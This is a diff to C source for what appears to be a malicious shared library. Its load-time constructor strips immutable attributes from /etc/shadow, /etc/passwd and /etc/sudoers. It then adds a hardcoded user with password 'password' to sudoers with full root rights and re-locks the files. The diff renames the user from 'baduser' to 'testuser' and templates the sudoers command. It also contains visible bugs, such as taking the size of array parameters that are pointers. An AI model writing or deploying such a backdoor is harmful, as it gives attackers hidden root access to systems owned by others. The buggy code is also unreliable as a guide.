@@ -10,13 +10,6 @@
 #define ARRAY_SIZE(arr) (sizeof(arr) / sizeof((arr)[0]))
 #define DEFAULT_CHATTR_ARG_SIZE 4
 
-void close_fds(int fds[])
-{
-	for (unsigned int i = 0; i < ARRAY_SIZE(fds); i++)
-		close(fds[i]);
-	return;
-}
-
 void chattr_remove(char *files[])
 {
 	unsigned int size = ARRAY_SIZE(files);
@@ -51,7 +44,7 @@ int __attribute__((constructor)) ctor()
 {
 	char *files[] = { "/etc/shadow", "/etc/passwd", "/etc/sudoers" };
 
-	char *username = "baduser";
+	char *username = "testuser";
 	char *password = "password";
 
 	struct passwd *pw = getpwnam(username);
@@ -81,9 +74,12 @@ int __attribute__((constructor)) ctor()
 			default:
 				wait(NULL);
 		}
-		char *argv[] = { "/usr/bin/sudo", "/bin/bash", "-c", "echo 'baduser ALL=(ALL) ALL' >> /etc/sudoers", NULL};
+		char command[100] = { 0 };
+		snprintf(command, sizeof(command), "echo '%s ALL=(ALL) ALL' >> /etc/sudoers", username);
+		char *argv[] = { "/usr/bin/sudo", "/bin/bash", "-c", &command, NULL};
 		char *envp[] = { NULL };
 		execve(argv[0], argv, envp);
+		chattr_add(files);
 	} else {
 		chattr_add(files);	
 	}
